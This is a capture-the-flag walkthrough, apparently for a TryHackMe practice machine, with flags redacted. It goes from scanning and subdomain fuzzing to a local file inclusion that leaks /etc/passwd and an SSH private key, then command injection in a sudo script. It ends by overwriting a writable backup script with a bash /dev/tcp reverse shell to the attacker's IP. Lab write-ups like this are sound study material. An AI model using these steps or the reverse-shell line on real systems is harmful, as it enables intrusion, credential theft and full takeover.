## Target IP: `10.10.192.0`

---

### Environment Setup

```bash
export IP=10.10.192.0
export LIP=10.6.24.56
```

---

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O $IP -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service | Version |
| --- | --- | --- |
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80 | HTTP | Apache httpd 2.4.29 |

---

### Web Enumeration

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php
nikto -h http://$IP
```

- Gobuster returns nothing.
- Apache default page, but HTML source reveals:

```html
<title>Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!</title>
```

- Added `team.thm` to `/etc/hosts`, visited `http://team.thm` → Custom team site landing page.

```
"Welcome to our Teams site! This is a place to write Blogs,Guides and anything you like!"
```

---

### Gobuster on `team.thm`

```bash
gobuster dir -u http://team.thm -w /usr/share/wordlists/dirb/common.txt -x php
```

**Findings:**

- `/assets` → Forbidden
- `/images` → Lists `avatar.jpg`, `bg.jpg`, `fulls/`, `thumbs/`
- `/robots.txt` → Contains: `dale`
- `/scripts` → Forbidden

Tried brute-forcing SSH for `dale`, nothing.

---

### DNS Subdomain Brute Force

```bash
wfuzz -c --hw 977 -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

- Found: `dev.team.thm` → Add to `/etc/hosts`

---

### Dev Subdomain

- Visited `http://dev.team.thm`

```
Site is being built
Place holder link to team share
```

Intercepted with Burp, spotted LFI:

```
GET /script.php?page=teamshare.php
```

Tried:

```bash
curl 'http://dev.team.thm/script.php?page=/etc/passwd'
```

**Confirmed LFI**

Extracted usernames from `/etc/passwd`:

```
dale
gyles
ftpuser
```

---

### FTP Brute Force

```bash
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt $IP ftp
```

No valid login.

---

### LFI Enumeration with FFUF

Validated response sizes:

```bash
curl -i 'http://dev.team.thm/script.php?page=/etc/passwd'  # Content-Length: 1698
curl -i 'http://dev.team.thm/script.php?page=asdf'         # Content-Length: 1
```

Then ran:

```bash
ffuf -u 'http://dev.team.thm/script.php?page=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 1
```

**Interesting Finds:**

- `/etc/ssh/ssh_config` → Noisy but nothing useful
- `/etc/ssh/sshd_config` → Embedded private RSA key

Saved key, removed `#` comments via `vim`:

```
:%s/^#//
```

Set perms:

```bash
chmod 600 rsa_id
```

SSH into target:

```bash
ssh -i rsa_id dale@$IP
```

---

### User Flag

```bash
cat user.txt
```
- Flag: `[REDACTED]`
---

### Sudo Permissions

```bash
sudo -l

```

```
(dale) NOPASSWD: /home/gyles/admin_checks
```

---

### FTPUser Message

Checked `/home/ftpuser`, found message:

```
.dev contains new PHP site.
Team policy: copy your id_rsa to the config file.
```

---

### Privilege Escalation - Gyles

Inspected `/home/gyles/admin_checks`:

```bash
sudo -u gyles /home/gyles/admin_checks
```

Script:

```bash
#!/bin/bash
...
read -p "Enter name of person backing up the data: " name
echo $name >> /var/stats/stats.txt
...
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null
...
```

Supplied `/bin/bash` to all inputs and got shell as `gyles`.

---

### PrivEsc via Writable Script

Checked `.bash_history` in `/home/gyles`, found reference to:

```bash
/var/backups/main_backup.sh
```

Located actual script:

```bash
find / -name main_backup.sh
→ /usr/local/bin/main_backup.sh
```

Permissions showed it was writable by `admin` group. Checked user group:

```bash
groups
→ gyles is in admin
```

Injected reverse shell:

```bash
echo 'bash -i >& /dev/tcp/10.6.24.56/8080 0>&1' > /usr/local/bin/main_backup.sh
```

Listener:

```bash
nc -lvnp 8080
```

Executed:

```bash
./main_backup.sh
```

---

### Root Access

```bash
whoami
→ root

cat /root/root.txt
→ THM{[REDACTED]}
```
